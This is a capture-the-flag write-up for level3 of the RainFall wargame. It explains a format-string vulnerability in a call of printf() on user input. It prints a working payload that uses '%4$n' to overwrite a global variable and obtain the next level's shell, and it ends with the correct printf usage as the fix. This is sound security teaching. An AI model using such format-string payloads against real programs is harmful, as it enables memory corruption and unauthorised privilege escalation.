##	Description

This level introduces a new component into the assembly code, global variables:

```bash
level3@RainFall:~$ readelf -a ./level3 
    66: 0804988c     4 OBJECT  GLOBAL DEFAULT   25 m
```

Once we have the source code identified and rewritten, we can see that the program no longer uses the `gets()` function to read input, but instead uses `fgets()` which is safer, since it allocates a fixed size buffer and limits the number of bytes read.

After the input is received, the program uses `printf()` to print the contents of the buffer. However, since `printf()` is being used without a format string, meaning it is vulnerable to format string attacks.

A format string attack is a type of vulnerability that occurs when `printf()` or a similar function is called with an input that contains format specifiers (like `%x`, `%s`, `%n`, etc.). Such input can allow the attacker to either read or write arbitrary memory locations on the stack.

Here, our goal is to overwrite the global variable `m` (located at address `0x804988c`) with the value `64` in order to pass the check and proceed to the shell execution.

We can achieve that by crafting a payload that prints 64 characters and then uses the `%n` format specifier to write the number of bytes printed so far into the memory address of `m`.

```bash
level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "%60c" + "%4$n")' >/tmp/payload
level3@RainFall:~$ cat /tmp/payload - | ./level3
�                                                           
Wait what?!
whoami
level4
```

The `%n` format specifier writes the number of characters printed so far into the memory address provided as an argument, and the `%4$n` specifier means "write n bytes in the fourth memory location. This allows to effectively write onto the stack.

The counter for that is to never use `printf()` (or similar functions) without a proper format string. Always specify a format string to avoid such vulnerabilities:

```c
printf("%s", buffer);	// Correct usage
printf(buffer);			// Vulnerable usage
```

###	References

- [Format String Attacks - OWASP](https://owasp.org/www-community/attacks/Format_string_attack)
- [Hacking Lab - Format String Vulnerability](https://hackinglab.cz/en/blog/format-string-vulnerability/)
